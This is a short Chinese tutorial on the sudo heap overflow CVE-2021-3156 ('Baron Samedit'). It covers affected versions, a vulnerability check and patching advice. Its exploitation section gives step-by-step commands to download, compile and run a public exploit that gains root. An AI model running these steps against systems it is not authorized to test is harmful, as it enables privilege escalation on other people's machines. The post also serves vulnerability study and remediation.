## 什么是Sudo
sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt、reboot、su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性，sudo不是对shell的一个代替，它是面向每个命令的。
```
当用户使用id命令查看
uid=1001(db_backup) gid=1001(db_backup) groups=1001(db_backup), 27(sudo)
有27(sudo)说明属于sudo组，可以输入本用户密码来使用sudo命令。
```
## Sudo溢出(CVE-2021-3156)漏洞原理

本漏洞存在于Sudo上--一个基于堆的缓冲区溢出漏洞（CVE-2021-3156，该漏洞被命名为“Baron Samedit”）
在sudo解析命令行参数的方式中发现了基于堆的缓冲区溢出。
当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。

## 影响范围
sudo程序 1.8.2 - 1.8.31p2
sudo程序 1.9.0 - 1.9.5p1
查看版本：sudo --version
条件：**需要目标服务器有桌面环境**，所以较为鸡肋的漏洞
判断：sudoedit -s / （报错：提示/不是常规文件 则存在漏洞）
## []()利用
判断：sudoedit -s / （报错：提示/不是常规文件 则存在漏洞）
```
下载exp
    • 下载：wget https://hub.fastgit.org/blasty/CVE-2021-3156/archive/main.zip
解压exp
    • unzip main.zip
编译exp
    make
提权
    ./sudo-hax-me-a-sandwich ubuntu

whoami
```
```
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
chmod a+x sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich 
选择内核
./sudo-hax-me-a-sandwich 1
whoami
```
## []()修复建议

目前官方已在sudo新版本1.9.5p2中修复了该漏洞，请受影响的用户尽快升级版本进行防护。\
下载地址：[https://www.sudo.ws/download.html](https://link.zhihu.com/?target=https%3A//www.sudo.ws/download.html)

